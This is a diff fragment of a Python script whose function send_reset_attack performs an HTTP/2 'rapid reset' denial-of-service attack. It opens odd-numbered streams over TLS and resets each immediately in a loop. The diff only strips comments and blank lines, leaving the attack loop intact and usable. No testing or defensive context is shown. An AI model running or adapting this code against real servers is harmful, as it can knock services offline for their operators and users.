@@ -78,7 +78,6 @@ def send_reset_attack():<br>
 
             # Send multiple streams with rapid resets<br>
             for stream_id in range(1, STREAM_COUNT * 2, 2):  # HTTP/2 streams are odd-numbered<br>
-                # Open a new stream<br>
                 conn.send_headers(<br>
                     stream_id=stream_id,<br>
                     headers=[<br>
@@ -88,15 +87,10 @@ def send_reset_attack():<br>
                         (":scheme", "https"),<br>
                     ],<br>
                 )<br>
-                tls_sock.sendall(conn.data_to_send())<br><br>
-
-                # Immediately reset the stream<br>
+                tls_sock.sendall(conn.data_to_send())<br>
                 conn.reset_stream(stream_id)<br>
                 tls_sock.sendall(conn.data_to_send())<br>
-
                 print(f"Stream {stream_id} reset sent")<br>
-
-            # Allow time for the attack to take effect<br>
             time.sleep(5)<br><br>
 
 if __name__ == "__main__":<br>
